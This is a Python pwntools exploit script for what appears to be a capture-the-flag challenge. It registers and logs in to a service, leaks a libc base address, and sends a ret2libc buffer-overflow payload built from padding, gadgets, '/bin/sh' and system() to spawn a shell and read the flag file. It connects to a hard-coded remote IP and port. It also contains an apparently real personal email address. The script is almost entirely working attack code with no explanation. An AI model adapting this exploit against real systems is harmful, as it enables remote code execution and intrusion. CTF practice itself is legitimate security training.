#!/usr/bin/env python3
from pwn import *

PORT = 47140
HOST = "144.79.188.39"
elf = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x00000000000051EE
            brva 0x0000000000004EBF
            brva 0x0000000000005265
            brva 0x00000000000052B4
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

# Stage 1: Login

sla(b'> Enter prompt', b'/signup')
sla(b'Username: ', b'd1nhdwc')
sla(b'Gmail: ', b'DucDV.B24AT059@stu.ptit.edu.vn')
sla(b'Password: ', b'123123456')

sla(b'> Enter prompt', b'/login')
sla(b'Username: ', b'd1nhdwc')
sla(b'Password: ', b'123123456')

# Stage 2: Leak libc

GDB()
sla(b'> Enter prompt', b'wide table')
p.recvuntil(b'libc leak: ')
libc.address = int(p.recvline().strip(), 16) - 0x2115c0
log.info(f'libc_base: {hex(libc.address)}')

# Stage 3: ret2libc

sla(b'> Enter prompt', b'/feedback')

pl = flat(
    b'A'*(0x100+8),
    libc.address + 0x0000000000119e9c + 1,
    libc.address + 0x0000000000119e9c,
    next(libc.search(b'/bin/sh\0')),
    libc.sym.system
    )
# GDB()
sla(b'Feedback: ', pl + b'\n')

p.sendline(b'cat flag.txt')
p.interactive()